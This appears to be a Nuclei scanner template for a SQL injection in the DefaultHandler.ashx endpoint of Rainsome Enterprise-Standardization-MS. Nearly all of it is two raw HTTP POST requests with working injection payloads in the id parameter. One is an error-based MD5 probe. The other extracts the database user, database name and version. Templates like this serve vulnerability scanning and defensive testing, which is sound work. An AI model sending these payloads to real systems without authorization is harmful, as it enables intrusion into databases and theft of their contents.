id: rainsome-sql-injection

info:
  name: Rainsome Enterprise-Standardization-MS DefaultHandler.ashx SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  description: |
    The Rainsome Enterprise-Standardization-MS system has a SQL injection vulnerability in the "DefaultHandler.ashx" endpoint. Attackers can exploit this to retrieve sensitive information from the database or achieve higher system privileges.
  tags: sql-injection
  reference:
    - http://www.rainsome.cn/

variables:
  exp: "user,db_name(),@@version"

http:
  - raw:
      - |
        POST /ashx/DefaultHandler.ashx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
        Content-Type: application/x-www-form-urlencoded
        Content-Length: {{len(body)}}

        action=GetDetail&status=300&id=1+and+%01(select+SUBSTRING(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123')),3,32))<0--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - "202cb962ac59075b964b07152d234b70"

  - raw:
      - |
        POST /ashx/DefaultHandler.ashx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
        Content-Type: application/x-www-form-urlencoded
        Content-Length: {{len(body)}}

        action=GetDetail&status=300&id=1+and+(select+{{exp}})>0--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
